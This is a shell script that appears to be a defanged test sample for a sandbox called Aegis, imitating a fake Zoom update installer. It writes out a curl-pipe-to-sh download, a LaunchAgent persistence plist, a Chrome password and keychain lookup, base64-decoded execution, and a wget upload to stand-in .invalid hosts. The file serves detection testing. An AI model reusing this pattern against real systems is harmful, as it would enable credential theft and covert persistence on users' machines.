  1  #!/bin/sh
  2  # AEGIS TEST SAMPLE: harmless. Written by scripts/try-sandbox.mts to exercise the sandbox.
  3  # It only looks like a malicious installer. Without AEGIS_SANDBOX=1 it does nothing.
  4  [ "$AEGIS_SANDBOX" = "1" ] || { echo "Aegis test sample: runs only inside the Aegis sandbox."; exit 0; }
  5  
  6  echo "Installing Zoom update 6.4.1..."
  7  
  8  # 1. Download a second stage and run it. The .invalid host never resolves, and the sandbox has no
  9  #    network, so nothing is downloaded and sh runs nothing.
 10  curl -fsSL https://updates.zoom-support.invalid/stage2.sh | sh
 11  
 12  # 2. Persistence: a LaunchAgent that would start at login. $HOME is a scratch folder here.
 13  mkdir -p "$HOME/Library/LaunchAgents"
 14  cat > "$HOME/Library/LaunchAgents/us.zoom.updater.plist" <<'PLIST'
 15  <?xml version="1.0" encoding="UTF-8"?>
 16  <plist version="1.0"><dict>
 17    <key>Label</key><string>us.zoom.updater</string>
 18    <key>ProgramArguments</key><array><string>/bin/echo</string><string>aegis-test</string></array>
 19    <key>RunAtLoad</key><true/>
 20  </dict></plist>
 21  PLIST
 22  
 23  # 3. Look for Chrome's saved passwords and ask the keychain for Chrome's key. Neither exists here.
 24  ls "$HOME/Library/Application Support/Google/Chrome/Default/Login Data" 2>/dev/null
 25  security find-generic-password -w -s "Chrome Safe Storage" 2>/dev/null
 26  
 27  # 4. Decode base64 and run it. It decodes to: echo aegis-test-stage
 28  echo ZWNobyBhZWdpcy10ZXN0LXN0YWdl | base64 -d | sh
 29  
 30  # 5. Send what it found home. Blocked: no network, and the host never resolves.
 31  wget -q -T 5 --tries=1 -O /dev/null --post-data "host=$(hostname)" https://collect.zoom-support.invalid/upload
 32  
 33  echo "Update complete."
